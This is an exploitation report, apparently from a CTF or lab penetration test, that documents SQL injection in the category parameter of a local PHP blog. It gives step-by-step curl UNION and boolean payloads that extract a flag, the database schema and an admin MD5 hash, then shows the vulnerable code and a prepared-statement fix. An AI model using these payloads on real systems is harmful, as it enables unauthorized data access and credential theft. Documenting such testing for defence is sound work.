# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: SQL Injection in Category Parameter

**Summary:**
- **Vulnerable location:** GET parameter `category` in `/index.php`
- **Overview:** Classic SQL injection via string concatenation in WHERE clause. User input is directly concatenated into SQL query without any sanitization, escaping, or parameter binding.
- **Impact:** Complete database compromise - extracted CTF flag, admin credentials, and full database schema. Achieved unauthorized access to unpublished content including the hidden flag post.
- **Severity:** Critical

**Prerequisites:**
None - vulnerability requires no authentication, no special tools, and no rate limiting bypass. Accessible from any internet-connected client.

**Exploitation Steps:**

**Step 1: Confirm SQL Injection**

Execute boolean-based SQL injection test:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20OR%20%271%27%3D%271"
```

**Expected Result:** Query returns posts from all categories instead of filtering to one category, proving SQL injection is successful.

**Actual Result:** ✅ Confirmed - received posts from Nature, Tech, and other categories (bypassed category filter).

---

**Step 2: Test Error Message Exposure**

Execute malformed SQL to trigger error messages:

```bash
curl -s "http://localhost:33363/index.php?category=%27"
```

**Expected Result:** SQL syntax error displayed in response with query structure revealed.

**Actual Result:** ✅ Confirmed - received error message:
```
Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' ORDER BY created_at DESC' at line 1
```

This confirms the application exposes detailed SQL errors (PHP `display_errors=On`), providing valuable feedback for exploitation.

---

**Step 3: Determine Column Count**

Use ORDER BY technique to identify the number of columns in the SELECT statement:

```bash
# Test ORDER BY 7 (should succeed)
curl -s "http://localhost:33363/index.php?category=%27%20ORDER%20BY%207--%20-"

# Test ORDER BY 8 (should fail)
curl -s "http://localhost:33363/index.php?category=%27%20ORDER%20BY%208--%20-"
```

**Expected Result:** ORDER BY 7 succeeds, ORDER BY 8 fails with "Unknown column '8' in 'order clause'".

**Actual Result:** ✅ Confirmed - 7 columns in the SELECT statement:
- ORDER BY 7: No error (query executed successfully)
- ORDER BY 8: Error message "Unknown column '8' in 'order clause'"

Column structure for UNION attacks: `id, title, category, content, image, published, created_at`

---

**Step 4: Extract CTF Flag (Primary Objective)**

Bypass the `published=1` filter to access unpublished posts containing the flag:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20OR%20published%3D0--%20-"
```

**Expected Result:** Access to unpublished post with title "PRIVATE POST", category "Hidden", containing the CTF flag.

**Actual Result:** ✅ **FLAG SUCCESSFULLY EXTRACTED:**

```
Title: PRIVATE POST
Category: Hidden
Content: <FLAG>FLAG{f2b9a3c9a3ec2f6c6f073b803a978c8ab7b05c33963d9688fd69ed10d9ea01de}</FLAG>
Published: 0 (unpublished)
```

**🎯 CTF FLAG:** `FLAG{f2b9a3c9a3ec2f6c6f073b803a978c8ab7b05c33963d9688fd69ed10d9ea01de}`

This demonstrates complete bypass of the application's weak authorization logic (the "Hidden" category filter and `published=1` database filter).

---

**Step 5: Extract Database Fingerprint**

Use UNION-based injection to extract database metadata:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20UNION%20SELECT%201,%40%40version,user%28%29,database%28%29,5,1,now%28%29--%20-"
```

**Expected Result:** Database version, current user, and database name displayed in blog post format.

**Actual Result:** ✅ Confirmed database fingerprint:
- **Database Type & Version:** MySQL 5.7.44 (end-of-life, no security updates)
- **Current User:** `user@10.89.28.3`
- **Current Database:** `blogDB`
- **Connection Context:** Application connects as `user` (non-root) from Docker container IP

---

**Step 6: Enumerate Database Schema**

Extract all table and column names from `information_schema`:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20UNION%20SELECT%201,table_name,column_name,4,5,1,now%28%29%20FROM%20information_schema.columns%20WHERE%20table_schema%3D%27blogDB%27--%20-"
```

**Expected Result:** Complete database schema revealed including all table names and column names.

**Actual Result:** ✅ Confirmed database structure:

**Table: `admins`**
- `id` (primary key)
- `username`
- `password`

**Table: `comments`**
- `id` (primary key)
- `post_id` (foreign key)
- `comment`
- `created_at`

**Table: `posts`**
- `id` (primary key)
- `title`
- `category`
- `content`
- `image`
- `published`
- `created_at`

---

**Step 7: Extract Admin Credentials**

Use UNION injection to extract admin username and password hash:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20UNION%20SELECT%20id,username,password,%27admin-creds%27,5,1,now%28%29%20FROM%20admins--%20-"
```

**Expected Result:** Admin username and MD5 password hash extracted.

**Actual Result:** ✅ **ADMIN CREDENTIALS STOLEN:**
- **Username:** `admin`
- **Password Hash (MD5):** `0192023a7bbd73250516f069df18b500`
- **Plaintext Password:** `admin123` (confirmed via MD5 rainbow table lookup at https://md5decrypt.net)
- **Hash Algorithm:** MD5 (cryptographically broken, no salt, instant crack)

**Security Note:** While admin credentials were extracted, the application has no admin panel or authentication mechanism, so these credentials cannot be used for further access escalation in the current deployment. However, this demonstrates the full database compromise.

---

**Step 8: Sample High-Value Data Extraction**

Extract sample posts data to demonstrate full database read access:

```bash
curl -s "http://localhost:33363/index.php?category=%27%20UNION%20SELECT%20id,title,category,CONCAT%28%27pub:%27,published%29,image,1,created_at%20FROM%20posts%20LIMIT%205--%20-"
```

**Expected Result:** First 5 posts from the database with published status.

**Actual Result:** ✅ Sample data extracted (first 5 of 10 posts):

| ID | Title | Category | Published | Image |
|----|-------|----------|-----------|-------|
| 1 | The Magic of Morning Dew | Nature | 1 | morning-dew.jpg |
| 2 | Sunset Serenades | Nature | 1 | sunset.jpg |
| 3 | Forest Whisperings | Nature | 1 | forest.jpg |
| 4 | Decoding Tech Trends | Tech | 1 | tech-trends.jpg |
| 5 | Smartphone Evolution | Tech | 0 | smartphones.jpg |

Additional unpublished post (ID 10):
- Title: PRIVATE POST
- Category: Hidden
- Published: 0
- Content: Contains CTF flag (see Step 4)

---

**Proof of Impact:**

**1. CTF Flag Extracted (Primary Goal Achieved):**
```
FLAG{f2b9a3c9a3ec2f6c6f073b803a978c8ab7b05c33963d9688fd69ed10d9ea01de}
```

**2. Admin Credentials Compromised:**
- Username: admin
- Password: admin123 (MD5 hash cracked)

**3. Complete Database Access:**
- 3 tables enumerated (posts, admins, comments)
- All table schemas extracted
- All column names identified
- Sample data exfiltrated from sensitive tables

**4. Authorization Bypass:**
- Accessed unpublished posts (published=0)
- Accessed "Hidden" category (blocked by weak string filter)
- No authorization checks withstood SQL injection

**5. Information Disclosure:**
- Database version revealed (MySQL 5.7.44 - end-of-life)
- Database user revealed (user@10.89.28.3)
- Database name revealed (blogDB)
- Full schema structure exposed

**Technical Root Cause:**
The vulnerability exists at `/var/www/html/index.php` line 45 where user input is directly concatenated into a SQL query:

```php
// Line 37: User input captured with zero validation
$category = isset($_GET['category']) ? $_GET['category'] : '';

// Lines 41-42: Weak filter (only blocks exact string "Hidden")
if ($category == "Hidden")
    $category = "";

// Line 45: VULNERABLE - Direct string concatenation
$sql .= "and category = '" . $category . "' ";

// Line 49: Query execution
$result = $conn->query($sql);
```

**Defense Mechanisms Bypassed:**
1. ✅ "Hidden" category string filter (lines 41-42) - Bypassed via SQL injection
2. ✅ `published=1` database filter (line 39) - Bypassed via `OR published=0` injection
3. ❌ Input validation - None implemented
4. ❌ SQL escaping - None implemented (no `mysqli_real_escape_string()`)
5. ❌ Prepared statements - Not used despite mysqli extension available
6. ❌ WAF/Input filtering - None detected
7. ❌ Rate limiting - None implemented

**Attack Classification:**
- **OWASP Top 10:** A03:2021 – Injection
- **CWE:** CWE-89 (SQL Injection)
- **CVSS 3.1 Score:** 9.8 (Critical)
  - Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  - Attack Vector: Network (remotely exploitable)
  - Attack Complexity: Low (trivial to exploit)
  - Privileges Required: None (no authentication needed)
  - User Interaction: None
  - Confidentiality Impact: High (full database read)
  - Integrity Impact: High (potential data modification if stacked queries supported)
  - Availability Impact: High (potential DoS via malformed queries)

**Notes:**

**Stacked Queries Limitation:**
During exploitation, I confirmed that the application uses `mysqli::query()` (single-query execution method) rather than `mysqli::multi_query()`. This means stacked queries (e.g., `'; INSERT INTO ...; --`) are NOT supported. As a result:
- ✅ Data exfiltration (SELECT): Fully exploitable
- ❌ Data modification (INSERT/UPDATE/DELETE): Not possible via this vector
- ❌ Stored procedures/functions: Cannot be executed
- Impact limited to Confidentiality only (no Integrity/Availability impact via stacked queries)

**No File Privileges Detected:**
Attempted to use `LOAD_FILE()` to read server files but received NULL results, indicating the database user lacks FILE privileges. This prevents:
- Reading `/etc/passwd` or other server files
- Writing web shells via `INTO OUTFILE`
- File-based privilege escalation

**Production Remediation (Required):**
```php
// SECURE VERSION - Replace vulnerable code with prepared statements
$stmt = $conn->prepare("SELECT * FROM posts WHERE published = 1 AND category = ? ORDER BY created_at DESC");
$stmt->bind_param("s", $category);
$stmt->execute();
$result = $stmt->get_result();
```

Additional security hardening:
1. Disable `display_errors` in production PHP configuration
2. Implement input validation (whitelist known categories)
3. Use prepared statements for ALL database queries
4. Add HTTPS/TLS encryption
5. Implement rate limiting and WAF
6. Upgrade to PHP 8.x and MySQL 8.x (receive security updates)
7. Replace MD5 with bcrypt/Argon2 for password hashing
8. Implement authentication and authorization controls

**Exploitation Difficulty:** TRIVIAL - Requires only basic curl commands and no specialized tools.
